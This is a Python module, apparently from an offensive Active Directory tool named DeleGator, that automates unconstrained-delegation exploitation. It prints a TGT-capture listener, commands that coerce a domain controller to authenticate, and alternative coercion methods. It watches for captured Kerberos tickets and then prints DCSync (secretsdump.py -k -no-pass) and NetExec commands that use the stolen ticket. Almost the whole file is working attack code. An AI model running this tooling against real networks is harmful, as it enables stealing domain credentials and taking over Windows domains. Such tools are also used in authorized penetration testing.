def _print_setup_guide(
    config:    UnconstrainedConfig,
    auth:      AuthContext,
) -> None:
    """
    Print step-by-step setup instructions for the coercion attack.
    This is the primary output of the unconstrained module when
    running in guidance mode (no --manual-ccache supplied).
    """
    username, cred_str = _get_auth_string(auth)

    listener_cmd  = _build_listener_command(
        config.listener_ip or "<YOUR_IP>",
        config.ccache_dir,
    )

    coerce_cmd = _build_coercion_command(
        method=config.coerce_method,
        domain=config.domain,
        username=username,
        password=cred_str,
        coerce_target=config.coerce_target or "<COERCE_TARGET>",
        listener_ip=config.listener_ip or "<YOUR_IP>",
    )

    divider()
    print()
    print(f"  \033[36mUnconstrained Delegation Attack Setup\033[0m")
    print(f"  \033[90mTarget machine  : {config.target}\033[0m")
    print(f"  \033[90mCoerce target   : {config.coerce_target or 'not specified'}\033[0m")
    print(f"  \033[90mCoerce method   : {config.coerce_method}\033[0m")
    print(f"  \033[90mListener IP     : {config.listener_ip or 'not specified'}\033[0m")
    print()

    print(f"  \033[36m# Step 1 — Start the TGT capture listener\033[0m")
    print(f"  \033[1m{listener_cmd}\033[0m")
    print()

    print(f"  \033[36m# Step 2 — Trigger coercion ({config.coerce_method})\033[0m")
    print(f"  \033[1m{coerce_cmd}\033[0m")
    print()

    print(f"  \033[36m# Step 3 — Wait for captured TGT in {config.ccache_dir}\033[0m")
    print(f"  \033[90m  DeleGator will monitor automatically if --watch is set\033[0m")
    print(f"  \033[90m  Or process manually: delegator.py exploit --type unconstrained\033[0m")
    print(f"  \033[90m    --manual-ccache /path/to/captured.ccache\033[0m")
    print()

    # Additional coercion methods
    print(f"  \033[36m# Alternative coercion methods\033[0m")
    for method in CoercionMethod.ALL_METHODS:
        if method == config.coerce_method:
            continue
        alt_cmd = _build_coercion_command(
            method=method,
            domain=config.domain,
            username=username,
            password=cred_str,
            coerce_target=config.coerce_target or "<COERCE_TARGET>",
            listener_ip=config.listener_ip or "<YOUR_IP>",
        )
        print(f"  \033[90m  [{method}] {alt_cmd}\033[0m")

    print()
    divider()


def _print_captured_ticket(ticket_info: dict, config: UnconstrainedConfig) -> None:
    """
    Print usage instructions for a captured TGT.
    """
    ccache_path = ticket_info["ccache_path"]
    client      = ticket_info["client"]

    divider()
    print(f"  \033[32m\033[1m[+] TGT captured successfully\033[0m")
    divider()
    print()
    print(f"  \033[36mCaptured principal : \033[0m\033[1m{client}@{config.domain.upper()}\033[0m")
    print(f"  \033[36mccache path        : \033[0m\033[32m{ccache_path}\033[0m")
    print()

    print(f"  \033[36m# Export the ticket\033[0m")
    print(f"  \033[1mexport KRB5CCNAME={ccache_path}\033[0m")
    print()

    print(f"  \033[36m# DCSync with the captured TGT\033[0m")
    dc_host = config.coerce_target or config.dc_ip
    print(f"  \033[1msecretsdump.py -k -no-pass {client}@{dc_host}\033[0m")
    print()

    print(f"  \033[36m# Or use with NetExec\033[0m")
    print(f"  \033[1mnetexec smb {dc_host} --use-kcache\033[0m")
    print()

    print(f"  \033[36m# Verify ticket with klist\033[0m")
    print(f"  \033[1mklist -c {ccache_path}\033[0m")
    print()
    divider()


# ---------------------------------------------------------------------------
# Main unconstrained delegation entry point
# ---------------------------------------------------------------------------

def run_unconstrained(
    auth:   AuthContext,
    config: UnconstrainedConfig,
) -> Optional[dict]:
    """
    Main entry point for the unconstrained delegation exploitation module.
    Called by delegator.py when `exploit --type unconstrained` is used.

    Two modes:
      1. Guidance mode (default) — prints coercion setup instructions
         and optionally monitors for captured TGTs
      2. Manual mode (--manual-ccache) — processes an already-captured
         ccache and prints usage instructions

    Returns a dict with ticket info on success, None on failure.
    """
    opsec = OpsecCheck(enabled=config.opsec_check)

    section("Unconstrained Delegation Exploitation")
    info(f"Target machine   : {config.target}")
    info(f"Domain           : {config.domain}")

    # Manual mode — process an existing ccache directly
    if config.manual_ccache:
        info(f"Processing captured ccache: {config.manual_ccache}")

        if not os.path.isfile(config.manual_ccache):
            error(f"ccache file not found: {config.manual_ccache}")
            return None

        ticket_info = _validate_captured_ccache(config.manual_ccache)
        if not ticket_info:
            return None

        success(f"Valid TGT found for: {ticket_info['client']}")

        if not is_json_mode():
            _print_captured_ticket(ticket_info, config)
            print_operation_noise("tgt_request")
        else:
            print_json({
                "type":       "unconstrained",
                "mode":       "manual",
                "client":     ticket_info["client"],
                "ccache_path": ticket_info["ccache_path"],
                "export_command": f"export KRB5CCNAME={ticket_info['ccache_path']}",
                "dcsync_cmd": (
                    f"secretsdump.py -k -no-pass "
                    f"{ticket_info['client']}@{config.coerce_target or config.dc_ip}"
                ),
            })

        return ticket_info

    # Guidance mode — print setup and optionally watch for captures
    if not config.coerce_target:
        warning(
            "No coerce target specified. Printing guidance with placeholder values.\n"
            "  Use --coerce-target <DC_HOSTNAME> to specify the machine to coerce."
        )

    if not config.listener_ip:
        warning(
            "No listener IP specified.\n"
            "  Use --listener-ip <YOUR_IP> to specify where the coercion listener runs."
        )

    # Check OPSEC before proceeding
    if not opsec.check("rbcd_write"):
        return None

    if not is_json_mode():
        _print_setup_guide(config, auth)

    # Optionally watch for captured ccaches
    # Only enter watch mode if both coerce target and listener IP are set
    if config.coerce_target and config.listener_ip:
        info(f"Watch mode active — monitoring {config.ccache_dir} for captures...")

        # Snapshot existing ccaches before we start
        try:
            existing = {
                f for f in os.listdir(config.ccache_dir)
                if f.endswith(".ccache")
            }
        except OSError:
            existing = set()

        captured = _watch_for_ccache(
            config.ccache_dir,
            config.watch_timeout,
            existing,
        )

        if not captured:
            warning(
                f"No ccache captured within {config.watch_timeout}s timeout.\n"
                "  Verify the coercion succeeded and the listener is writing "
                f"ccaches to {config.ccache_dir}.\n"
                "  Process manually with: --manual-ccache /path/to/captured.ccache"
            )
            return None

        success(f"Captured ccache: {captured}")
        ticket_info = _validate_captured_ccache(captured)

        if not ticket_info:
            return None

        if not is_json_mode():
            _print_captured_ticket(ticket_info, config)
        else:
            print_json({
                "type":        "unconstrained",
                "mode":        "watched",
                "client":      ticket_info["client"],
                "ccache_path": ticket_info["ccache_path"],
                "export_command": f"export KRB5CCNAME={ticket_info['ccache_path']}",
            })

        return ticket_info

    # Guidance only — no watch mode
    info(
        "Guidance printed. Run coercion and listener manually, then process "
        "the captured ccache with:\n"
        f"  delegator.py exploit --type unconstrained "
        f"--target {config.target} "
        f"--manual-ccache /path/to/captured.ccache "
        f"-d {config.domain} -u <user> -p <pass>"
    )

    return None
